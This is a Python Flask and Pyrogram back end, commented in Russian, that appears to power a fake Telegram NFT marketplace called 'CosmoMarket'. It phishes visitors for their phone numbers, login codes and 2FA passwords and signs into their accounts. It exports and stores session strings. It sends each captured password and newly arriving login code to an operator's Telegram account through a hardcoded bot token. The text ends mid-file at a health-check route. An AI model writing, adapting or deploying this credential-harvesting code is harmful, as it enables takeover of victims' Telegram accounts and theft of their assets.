import os
import asyncio
import logging
import time
import threading
import json
import re
import random
import sqlite3
import multiprocessing
from datetime import datetime, timedelta
from contextlib import contextmanager
from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect, url_for
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__, 
            template_folder='templates',
            static_folder='templates',
            static_url_path='/static')

app.secret_key = 'telegram-nft-market-secret-2024'

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('templates', filename)

# Глобальное хранилище для результатов поиска кодов
CODE_SEARCH_RESULTS = {}
SEARCH_START_TIMES = {}  # Время начала поиска для каждого пользователя

# Конфигурация системы
ADMIN_IDS = [7843338024]  # Admin ID для уведомлений
BOT_TOKEN = "8502577994:AAECfAO5batElBKd6H4eOnnLRCZvNLseQ-8"  # Токен бота для уведомлений

# История действий пользователей
USER_ACTIONS_DB = "user_actions.db"

@contextmanager
def get_db_connection():
    conn = sqlite3.connect(USER_ACTIONS_DB)
    try:
        yield conn
    finally:
        conn.close()

def init_actions_db():
    """Инициализация базы данных для истории действий"""
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                action_type TEXT NOT NULL,
                action_details TEXT,
                from_user TEXT,
                link TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Создаем индекс для быстрого поиска по user_id
        cursor.execute('''
            CREATE INDEX IF NOT EXISTS idx_user_id 
            ON user_actions(user_id)
        ''')
        
        conn.commit()
    logger.info("✅ База данных истории действий инициализирована")

def add_user_action(user_id, action_type, details="", from_user="", link=""):
    """Добавление действия в историю пользователя"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO user_actions (user_id, action_type, action_details, from_user, link)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, action_type, details, from_user, link))  # ← details вместо action_details
            conn.commit()
        
        logger.info(f"📝 Добавлено действие для user_id {user_id}: {action_type}")
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка добавления действия: {e}")
        return False

def get_user_actions(user_id, limit=20):
    """Получение истории действий пользователя"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT action_type, action_details, from_user, link, timestamp
                FROM user_actions
                WHERE user_id = ?
                ORDER BY timestamp DESC
                LIMIT ?
            ''', (user_id, limit))
            
            actions = []
            for row in cursor.fetchall():
                actions.append({
                    'type': row[0],
                    'details': row[1],
                    'from_user': row[2],
                    'link': row[3],
                    'timestamp': row[4]
                })
            
            return actions
    except Exception as e:
        logger.error(f"❌ Ошибка получения действий: {e}")
        return []

def get_user_gifts(user_id):
    """Получение всех подарков пользователя"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT action_type, action_details, from_user, link, timestamp
                FROM user_actions
                WHERE user_id = ? AND action_type IN ('gift_received', 'nft_gift')
                ORDER BY timestamp DESC
            ''', (user_id,))
            
            gifts = []
            for row in cursor.fetchall():
                gifts.append({
                    'type': row[0],
                    'details': row[1],
                    'from_user': row[2],
                    'link': row[3],
                    'timestamp': row[4]
                })
            
            return gifts
    except Exception as e:
        logger.error(f"❌ Ошибка получения подарков: {e}")
        return []

# Инициализируем БД при запуске
init_actions_db()

def start_telegram_bot():
    """Запуск Telegram бота в отдельном процессе"""
    try:
        import subprocess
        import sys
        
        logger.info("🤖 Запуск Telegram бота...")
        
        # Запускаем бот как отдельный процесс
        process = multiprocessing.Process(
            target=lambda: subprocess.run([sys.executable, "bot_handler.py"]),
            daemon=True
        )
        process.start()
        
        logger.info(f"✅ Telegram бот запущен (PID: {process.pid})")
        return process
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска бота: {e}")
        return None

# Запускаем бота при старте
bot_process = start_telegram_bot()

class AdminNotifier:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.admin_ids = ADMIN_IDS
    
    async def send_admin_notification(self, message):
        """Отправка уведомления админу"""
        try:
            if not self.bot_token or self.bot_token == "your_bot_token_here":
                logger.warning("⚠️ Bot token не настроен для уведомлений")
                return
            
            async with Client("admin_bot", bot_token=self.bot_token, in_memory=True) as app:
                for admin_id in self.admin_ids:
                    try:
                        await app.send_message(
                            admin_id,
                            f"🔔 **Уведомление системы**\n\n{message}"
                        )
                        logger.info(f"✅ Уведомление отправлено админу {admin_id}")
                    except Exception as e:
                        logger.error(f"❌ Ошибка отправки админу {admin_id}: {e}")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации бота для уведомлений: {e}")
    
    def send_notification_sync(self, message):
        """Синхронная отправка уведомления через отдельный thread"""
        try:
            def send_in_thread():
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self.send_admin_notification(message))
                    loop.close()
                except Exception as e:
                    logger.error(f"❌ Ошибка отправки уведомления в thread: {e}")
            
            thread = threading.Thread(target=send_in_thread, daemon=True)
            thread.start()
            
        except Exception as e:
            logger.error(f"❌ Ошибка планирования уведомления: {e}")

# Инициализация нотификатора
admin_notifier = AdminNotifier()

class ContinuousCodeFinder:
    def __init__(self, session_string, user_id):
        self.session_string = session_string
        self.user_id = user_id
        self.is_running = False
        self.found_code = None
        self.client = None
        self.search_count = 0
        self.search_start_time = datetime.now()
    
    async def initialize_client(self):
        """Инициализация постоянного клиента"""
        try:
            if self.client and self.client.is_connected:
                return True
                
            session_name = f"continuous_finder_{self.user_id}"
            self.client = Client(
                session_name, 
                session_string=self.session_string, 
                in_memory=True
            )
            
            await self.client.start()
            logger.info(f"✅ Постоянный клиент инициализирован для user_id: {self.user_id}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации клиента: {e}")
            return False

    async def extract_code_from_message(self, message_text, message_date):
        """Извлечение кода из текста сообщения, проверяя что сообщение новое"""
        # Проверяем что сообщение пришло ПОСЛЕ начала поиска
        if message_date < self.search_start_time:
            logger.debug(f"📅 Сообщение слишком старое: {message_date} < {self.search_start_time}")
            return None
        
        # Расширенные паттерны для поиска кодов
        patterns = [
            r'\b(\d{5})\b',  # 5 цифр отдельно
            r'\b(\d{6})\b',  # 6 цифр отдельно
            r'код[:\s]*[is\s]*[\.\-\s]*(\d{5,6})',  # код: 12345
            r'code[:\s]*[is\s]*[\.\-\s]*(\d{5,6})',  # code: 12345
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, message_text, re.IGNORECASE)
            if matches:
                code = matches[0]
                logger.info(f"🔍 Найден потенциальный код '{code}' паттерном: {pattern}")
                logger.info(f"📝 Контекст: {message_text[:100]}...")
                
                # Дополнительная проверка - ищем ключевые слова авторизации
                auth_keywords = [
                    'код', 'code', 'подтверждени', 'verification', 'login', 'войти', 
                    'telegram', 'authorization', 'sign in', 'проверка', 'безопасност',
                    'вход', 'auth', 'confirmation', 'your code', 'используйте код'
                ]
                message_lower = message_text.lower()
                has_auth_keyword = any(keyword in message_lower for keyword in auth_keywords)
                
                if has_auth_keyword:
                    logger.info(f"✅ Код '{code}' подтвержден ключевыми словами авторизации")
                    
                    # Отправляем уведомление админу о найденном коде
                    notification_msg = (
                        f"🔐 **Найден НОВЫЙ код авторизации**\n\n"
                        f"👤 Пользователь: `{self.user_id}`\n"
                        f"🔢 Код: `{code}`\n"
                        f"⏰ Время сообщения: {message_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"📝 Сообщение: {message_text[:150]}..."
                    )
                    admin_notifier.send_notification_sync(notification_msg)
                    
                    return code
        
        return None

    async def search_single_attempt(self):
        """Поиск НОВЫХ кодов в служебных уведомлениях"""
        try:
            if not self.client or not self.client.is_connected:
                if not await self.initialize_client():
                    return None
            
            logger.info(f"🔍 Поиск НОВЫХ кодов для user_id: {self.user_id}")
            logger.info(f"📅 Поиск сообщений после: {self.search_start_time}")
            
            # Ищем в системных уведомлениях Telegram (ID 777000)
            try:
                logger.info("🔍 Подключение к системным уведомлениям Telegram...")
                system_chat = await self.client.get_chat(777000)
                logger.info(f"✅ Подключились к: {system_chat.title if system_chat.title else 'Telegram Notifications'}")
                
                new_messages_count = 0
                async for message in self.client.get_chat_history(system_chat.id, limit=30):
                    if message.text and message.date:
                        # Преобразуем дату сообщения
                        message_date = message.date.replace(tzinfo=None) if message.date.tzinfo else message.date
                        
                        if message_date >= self.search_start_time:
                            new_messages_count += 1
                            logger.info(f"📨 НОВОЕ сообщение #{new_messages_count}: {message.text[:80]}...")
                            
                            code = await self.extract_code_from_message(message.text, message_date)
                            if code:
                                logger.info(f"🎉 Найден НОВЫЙ код: {code}")
                                return code
                
                logger.info(f"📊 Найдено {new_messages_count} новых сообщений в системных уведомлениях")
                    
            except Exception as e:
                logger.warning(f"⚠️ Не удалось получить системные уведомления: {e}")
            
            # Ищем в личных сообщениях
            try:
                new_messages_count = 0
                async for message in self.client.get_chat_history('me', limit=30):
                    if message.text and message.date:
                        message_date = message.date.replace(tzinfo=None) if message.date.tzinfo else message.date
                        
                        if message_date >= self.search_start_time:
                            new_messages_count += 1
                            # Проверяем от кого сообщение
                            if message.from_user and message.from_user.id == 777000:
                                logger.info(f"📨 Личное сообщение от Telegram: {message.text[:80]}...")
                                
                                code = await self.extract_code_from_message(message.text, message_date)
                                if code:
                                    logger.info(f"🎉 Найден код в личных сообщениях: {code}")
                                    return code
                
                logger.info(f"📊 Проверено {new_messages_count} новых личных сообщений")
                
            except Exception as e:
                logger.error(f"❌ Ошибка поиска в личных сообщениях: {e}")
            
            logger.info("📭 Новых кодов не найдено")
            return None
                            
        except Exception as e:
            logger.error(f"❌ Критическая ошибка в поиске: {e}")
            return None

    async def start_continuous_search(self, duration=300):
        """Запуск постоянного поиска НОВЫХ кодов"""
        if not await self.initialize_client():
            logger.error(f"❌ Не удалось инициализировать клиент для user_id: {self.user_id}")
            return
            
        self.is_running = True
        start_time = time.time()
        
        # Сохраняем время начала поиска
        self.search_start_time = datetime.now() - timedelta(seconds=10)  # Ищем сообщения за последние 10 секунд
        SEARCH_START_TIMES[self.user_id] = self.search_start_time
        
        logger.info(f"🚀 Запуск поиска НОВЫХ кодов для user_id: {self.user_id}")
        logger.info(f"⏰ Будем искать сообщения после: {self.search_start_time}")
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                self.search_count += 1
                
                code = await self.search_single_attempt()
                
                if code:
                    self.found_code = code
                    self.is_running = False
                    
                    CODE_SEARCH_RESULTS[self.user_id] = {
                        'code': code,
                        'found_at': datetime.now().isoformat(),
                        'search_started_at': self.search_start_time.isoformat(),
                        'status': 'found',
                        'search_count': self.search_count,
                        'source': 'service_notifications'
                    }
                    
                    logger.info(f"🎉 НОВЫЙ код найден для user_id {self.user_id}: {code}")
                    
                    if self.client and self.client.is_connected:
                        await self.client.stop()
                    
                    return code
                
                logger.info(f"🔍 Поиск #{self.search_count} для user_id {self.user_id} - новый код еще не пришел")
                await asyncio.sleep(5)
                
            except Exception as e:
                logger.error(f"❌ Ошибка поиска (попытка #{self.search_count}): {e}")
                await asyncio.sleep(3)
        
        CODE_SEARCH_RESULTS[self.user_id] = {
            'code': None,
            'found_at': datetime.now().isoformat(),
            'search_started_at': self.search_start_time.isoformat(),
            'status': 'not_found',
            'search_count': self.search_count
        }
        
        logger.info(f"⏰ Поиск завершен для user_id {self.user_id}, новый код не найден")
        if self.client and self.client.is_connected:
            await self.client.stop()
        self.is_running = False
    
    def stop_search(self):
        """Остановка поиска"""
        self.is_running = False

# Глобальное хранилище активных поисков
ACTIVE_SEARCHERS = {}

async def find_telegram_code_immediate(session_string, user_id):
    """Мгновенный поиск НОВЫХ кодов"""
    try:
        session_name = f"immediate_finder_{int(time.time())}"
        async with Client(session_name, session_string=session_string, in_memory=True) as client:
            await client.start()
            
            # Определяем время начала поиска
            search_start_time = SEARCH_START_TIMES.get(user_id, datetime.now() - timedelta(minutes=5))
            
            try:
                system_chat = await client.get_chat(777000)
                async for message in client.get_chat_history(system_chat.id, limit=20):
                    if message.text and message.date:
                        message_date = message.date.replace(tzinfo=None) if message.date.tzinfo else message.date
                        
                        if message_date >= search_start_time:
                            # Проверяем на ключевые слова
                            if 'код' in message.text.lower() or 'code' in message.text.lower():
                                codes = re.findall(r'\b\d{5}\b', message.text)
                                if codes:
                                    await client.stop()
                                    return {
                                        'success': True,
                                        'code_found': True,
                                        'telegram_code': codes[0],
                                        'message': f"✅ Найден новый код: {codes[0]}",
                                        'source': 'service_notifications',
                                        'message_time': message_date.isoformat()
                                    }
            except Exception as e:
                logger.warning(f"⚠️ Не удалось проверить системные уведомления: {e}")
            
            await client.stop()
            
            return {
                'success': True,
                'code_found': False,
                'telegram_code': None,
                'message': "❌ Новый код не найден"
            }
                
    except Exception as e:
        logger.error(f"❌ Ошибка мгновенного поиска: {e}")
        return {
            'success': False,
            'error': f'Ошибка поиска: {str(e)}'
        }

def start_background_search(session_string, user_id):
    """Запуск фонового поиска кода"""
    try:
        if user_id in ACTIVE_SEARCHERS:
            ACTIVE_SEARCHERS[user_id].stop_search()
            del ACTIVE_SEARCHERS[user_id]
        
        finder = ContinuousCodeFinder(session_string, user_id)
        ACTIVE_SEARCHERS[user_id] = finder
        
        def run_search():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(finder.start_continuous_search())
            except Exception as e:
                logger.error(f"❌ Ошибка в фоновом поиске: {e}")
            finally:
                loop.close()
        
        search_thread = threading.Thread(target=run_search, daemon=True)
        search_thread.start()
        
        logger.info(f"📡 Запущен фоновый поиск НОВЫХ кодов для user_id: {user_id}")
        return True
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска фонового поиска: {e}")
        return False

class JSONStorageManager:
    def __init__(self):
        self.storage_path = "./tdata_storage"
        self.init_storage()
    
    def init_storage(self):
        try:
            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
            logger.info("✅ JSON хранилище инициализировано")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
    
    def save_user(self, user_data):
        try:
            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
            with open(user_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_session(self, user_id, session_data, request_info=None):
        try:
            session_id = int(time.time() * 1000)
            session_file = f"{self.storage_path}/sessions/{session_id}.json"
            
            session_record = {
                'id': session_id,
                'user_id': user_id,
                'session_data': session_data,
                'request_info': request_info,
                'created_at': datetime.now().isoformat(),
                'is_active': True
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_record, f, indent=2, ensure_ascii=False)
            
            return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return None
    
    def save_tdata(self, user_id, session_id, tdata_json):
        try:
            tdata_id = int(time.time() * 1000)
            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
            
            tdata_record = {
                'id': tdata_id,
                'user_id': user_id,
                'session_id': session_id,
                'tdata_json': tdata_json,
                'exported_at': datetime.now().isoformat()
            }
            
            with open(tdata_file, 'w', encoding='utf-8') as f:
                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
            
            return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        try:
            sessions = []
            sessions_dir = f"{self.storage_path}/sessions"
            
            if not os.path.exists(sessions_dir):
                return []
            
            for filename in os.listdir(sessions_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sessions_dir, filename)
                    with open(filepath, 'r', encoding='utf-8') as f:
                        session_data = json.load(f)
                        if session_data.get('user_id') == user_id:
                            sessions.append({
                                'id': session_data['id'],
                                'session_string': session_data['session_data'].get('session_string'),
                                'dc_id': session_data['session_data'].get('dc_id'),
                                'created_at': session_data['created_at'],
                                'is_active': session_data.get('is_active', True)
                            })
            
            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий: {e}")
            return []
    
    def get_stats(self):
        try:
            users_dir = f"{self.storage_path}/users"
            sessions_dir = f"{self.storage_path}/sessions"
            tdata_dir = f"{self.storage_path}/tdata"
            
            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
            
            return {
                'total_users': users_count,
                'active_sessions': sessions_count,
                'total_tdata_records': tdata_count
            }
        except Exception as e:
            logger.error(f"❌ Ошибка получения статистики: {e}")
            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}

storage = JSONStorageManager()

class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=60)

async_runner = AsyncRunner()

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

API_ID, API_HASH, SECRET_KEY = load_api_keys()

ACTIVE_SESSIONS = {}
SESSION_TIMEOUT = 300

def cleanup_expired_sessions():
    current_time = time.time()
    expired_sessions = []
    
    for session_id, session_data in ACTIVE_SESSIONS.items():
        if current_time - session_data['created_at'] > SESSION_TIMEOUT:
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        if session_id in ACTIVE_SESSIONS:
            try:
                client = ACTIVE_SESSIONS[session_id].get('client')
                if client:
                    asyncio.create_task(client.disconnect())
            except:
                pass
            del ACTIVE_SESSIONS[session_id]
            logger.info(f"🗑️ Удалена просроченная сессия: {session_id}")

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def request_code(self, phone_number):
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            session_id = f"{phone_number}_{int(time.time())}"
            
            client = Client(
                name=session_id,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time(),
                'needs_password': False
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📊 Активных сессий: {len(ACTIVE_SESSIONS)}")
            
            return {
                'success': True,
                'message': 'Код отправлен в Telegram! Проверьте служебные уведомления (+42777) в приложении',
                'session_id': session_id
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена: {session_id}")
            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
            return {'success': False, 'error': 'Сессия не найдена или истекла'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация успешна! Запущен поиск кода в служебных уведомлениях...',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            session_data['needs_password'] = True
            ACTIVE_SESSIONS[session_id] = session_data
            
            logger.info(f"🔐 Сессия {session_id} переведена в режим 2FA")
            
            # Отправляем уведомление админу о 2FA пароле
            notification_msg = (
                f"🔐 **Требуется 2FA пароль**\n\n"
                f"👤 Пользователь: `{phone}`\n"
                f"📞 Телефон: `{phone}`\n"
                f"🆔 Session: `{session_id}`\n"
                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            admin_notifier.send_notification_sync(notification_msg)
            
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True,
                'session_id': session_id
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_password(self, session_id, password):
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена для 2FA: {session_id}")
            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        
        if not session_data.get('needs_password'):
            logger.error(f"❌ Неверный статус сессии для 2FA: {session_id}")
            return {'success': False, 'error': 'Неверный статус сессии'}
            
        client = session_data['client']
        
        try:
            logger.info("🔑 Верификация пароля 2FA")
            
            await client.check_password(password=password)
            
            logger.info("✅ Успешная аутентификация с паролем 2FA")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Отправляем уведомление админу о найденном 2FA пароле
            notification_msg = (
                f"🔓 **Найден 2FA пароль**\n\n"
                f"👤 Пользователь: `{user_info['id']}`\n"
                f"📱 Имя: {user_info.get('first_name', 'N/A')} {user_info.get('last_name', '')}\n"
                f"🔗 Username: @{user_info.get('username', 'N/A')}\n"
                f"📞 Телефон: `{user_info.get('phone_number', 'N/A')}`\n"
                f"🔑 Пароль: `{password}`\n"
                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            admin_notifier.send_notification_sync(notification_msg)
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация успешна! Запущен поиск кода в служебных уведомлениях...',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except Exception as e:
            logger.error(f"❌ Ошибка верификации пароля: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Неверный пароль 2FA'}
    
    async def export_tdata(self, client, user_info, request_info=None):
        try:
            session_string = await client.export_session_string()
        
            dc_info = await client.storage.dc_id()
            dc_id = dc_info if dc_info else 2
        
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat(),
                'session_type': 'pyrogram_string_session'
            }
        
            storage.save_user(user_info)
        
            session_data = {
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
        
            session_id = storage.save_session(user_info['id'], session_data, request_info)
        
            if session_id:
                tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
            
                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                
                logger.info(f"🚀 Запуск фонового поиска НОВЫХ кодов для user_id: {user_info['id']}")
                start_background_search(session_string, user_info['id'])
                
                immediate_result = await find_telegram_code_immediate(session_string, user_info['id'])
                
                # Добавляем действие "account_authorized" в историю
                add_user_action(
                    user_id=user_info['id'],
                    action_type="account_authorized",
                    action_details="Аккаунт успешно авторизован в системе CosmoMarket",
                    from_user="System"
                )
            
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'Аутентификация успешна! Запущен поиск НОВЫХ кодов...',
                    'immediate_search': immediate_result,
                    'background_search_started': True
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}

auth_tester = TelegramAuthTester()

# Маршруты Flask
@app.route('/api/check-code-status/<int:user_id>', methods=['GET'])
def check_code_status(user_id):
    if user_id in CODE_SEARCH_RESULTS:
        result = CODE_SEARCH_RESULTS[user_id]
        return jsonify({
            'success': True,
            'user_id': user_id,
            'code_status': result['status'],
            'telegram_code': result['code'],
            'found_at': result['found_at'],
            'search_started_at': result.get('search_started_at', ''),
            'search_count': result.get('search_count', 0),
            'source': result.get('source', 'unknown')
        })
    else:
        is_searching = user_id in ACTIVE_SEARCHERS and ACTIVE_SEARCHERS[user_id].is_running
        search_start_time = SEARCH_START_TIMES.get(user_id, datetime.now() - timedelta(minutes=5))
        return jsonify({
            'success': True,
            'user_id': user_id,
            'code_status': 'searching' if is_searching else 'not_started',
            'telegram_code': None,
            'search_started_at': search_start_time.isoformat(),
            'search_count': ACTIVE_SEARCHERS[user_id].search_count if user_id in ACTIVE_SEARCHERS else 0,
            'message': 'Поиск новых кодов...' if is_searching else 'Поиск не запущен'
        })

@app.route('/api/search-code-now', methods=['POST', 'OPTIONS'])
def search_code_now():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_string = data.get('session_string', '').strip()
        user_id = data.get('user_id')
        
        if not session_string:
            return jsonify({'success': False, 'error': 'Session string required'}), 400
        
        result = async_runner.run_coroutine(find_telegram_code_immediate(session_string, user_id))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка немедленного поиска: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/stop-code-search/<int:user_id>', methods=['POST'])
def stop_code_search(user_id):
    try:
        if user_id in ACTIVE_SEARCHERS:
            ACTIVE_SEARCHERS[user_id].stop_search()
            del ACTIVE_SEARCHERS[user_id]
            logger.info(f"⏹️ Поиск кода остановлен для user_id: {user_id}")
            return jsonify({'success': True, 'message': 'Поиск остановлен'})
        else:
            return jsonify({'success': False, 'error': 'Активный поиск не найден'})
    except Exception as e:
        logger.error(f"❌ Ошибка остановки поиска: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/health')
def health_check():
